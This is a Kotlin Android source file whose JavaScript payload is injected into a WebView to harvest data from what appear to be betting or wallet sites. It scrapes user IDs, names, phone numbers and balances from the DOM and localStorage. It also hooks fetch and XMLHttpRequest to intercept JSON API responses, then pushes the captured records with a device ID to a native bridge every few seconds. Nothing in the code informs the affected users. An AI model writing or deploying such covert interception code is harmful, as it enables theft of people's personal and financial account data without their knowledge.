package com.knt.captureclient

import android.webkit.WebView

object JsInjector {

    private const val HOOK_JS = """
(function() {
    if (window.__kntHooked) return;
    window.__kntHooked = true;

    // ---- DOM readers (dkwin7 style pages) ----
    function readText(selectors) {
        for (var i = 0; i < selectors.length; i++) {
            try {
                var el = document.querySelector(selectors[i]);
                if (el && el.textContent) return el.textContent.trim();
            } catch(e) {}
        }
        return "";
    }

    function readUid() {
        // try DOM first
        var sels = [
            '.user-id', '.uid', '.user-info .id',
            '[data-uid]', '[data-user-id]', '.profile-id'
        ];
        for (var i = 0; i < sels.length; i++) {
            try {
                var el = document.querySelector(sels[i]);
                if (el) {
                    var v = el.getAttribute('data-uid') ||
                            el.getAttribute('data-user-id') ||
                            el.textContent;
                    if (v) return v.replace(/[^0-9a-zA-Z]/g, '');
                }
            } catch(e) {}
        }

        // try localStorage
        try {
            var keys = Object.keys(localStorage);
            for (var i = 0; i < keys.length; i++) {
                var k = keys[i].toLowerCase();
                if (k.indexOf('user') !== -1 || k.indexOf('uid') !== -1) {
                    var raw = localStorage.getItem(keys[i]) || '';
                    try {
                        var j = JSON.parse(raw);
                        if (j && (j.uid || j.id || j.userId)) {
                            return String(j.uid || j.id || j.userId);
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}

        // try body text regex
        try {
            var t = document.body.innerText || '';
            var m = t.match(/UID[:\s|]+(\d{4,})/i);
            if (m) return m[1];
        } catch(e) {}

        return "";
    }

    function readBalance() {
        var v = readText([
            '.balance', '.user-balance', '.wallet-balance',
            '[data-balance]', '.total-balance'
        ]);
        return v.replace(/[^0-9.,]/g, '');
    }

    function readPhone() {
        var v = readText(['.phone', '.user-phone', '[data-phone]']);
        return v.replace(/[^0-9]/g, '');
    }

    function readName() {
        return readText(['.username', '.nickname', '.user-name', '.nick-name']);
    }

    // ---- push to kotlin ----
    function pushCapture(uid) {
        if (!uid || uid.length < 3) return;
        try {
            var payload = {
                device_id: (window.KNTDeviceId || ''),
                uid: String(uid),
                userName: readName() || '',
                nickName: readName() || '',
                phone: readPhone() || '',
                balance: readBalance() || '',
                amountOfCode: '',
                host: location.host,
                sourceUrl: location.href,
                updatedAt: Date.now(),
                raw: ''
            };
            if (window.KNTBridge && window.KNTBridge.push) {
                window.KNTBridge.push(JSON.stringify(payload));
            }
        } catch(e) {}
    }

    // ---- run loop ----
    function scan() {
        try {
            var uid = readUid();
            if (uid) pushCapture(uid);
        } catch(e) {}
        setTimeout(scan, 3000);
    }
    setTimeout(scan, 1500);

    // ---- hook fetch for api responses ----
    var origFetch = window.fetch;
    if (origFetch) {
        window.fetch = function() {
            return origFetch.apply(this, arguments).then(function(resp) {
                try {
                    var cl = resp.headers.get('content-type') || '';
                    if (cl.indexOf('json') !== -1) {
                        resp.clone().json().then(function(j) {
                            tryParseUserJson(j);
                        }).catch(function(){});
                    }
                } catch(e) {}
                return resp;
            });
        };
    }

    // ---- hook XHR ----
    var origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function() {
        this.addEventListener('load', function() {
            try {
                var ct = this.getResponseHeader('content-type') || '';
                if (ct.indexOf('json') !== -1 && this.responseText) {
                    try {
                        var j = JSON.parse(this.responseText);
                        tryParseUserJson(j);
                    } catch(e) {}
                }
            } catch(e) {}
        });
        return origOpen.apply(this, arguments);
    };

    function tryParseUserJson(obj) {
        try {
            if (!obj) return;
            var stack = [obj];
            var depth = 0;
            while (stack.length && depth < 200) {
                depth++;
                var cur = stack.shift();
                if (!cur || typeof cur !== 'object') continue;
                if (cur.uid || cur.userId || cur.user_id) {
                    var v = cur.uid || cur.userId || cur.user_id;
                    pushCapture(String(v));
                }
                for (var k in cur) {
                    if (typeof cur[k] === 'object') stack.push(cur[k]);
                }
            }
        } catch(e) {}
    }
})();
"""

    fun inject(webView: WebView, targetHost: String) {
        // set device id first
        val did = Prefs.deviceId ?: ""
        webView.evaluateJavascript("window.KNTDeviceId = '$did';", null)
        webView.evaluateJavascript(HOOK_JS, null)
    }
}
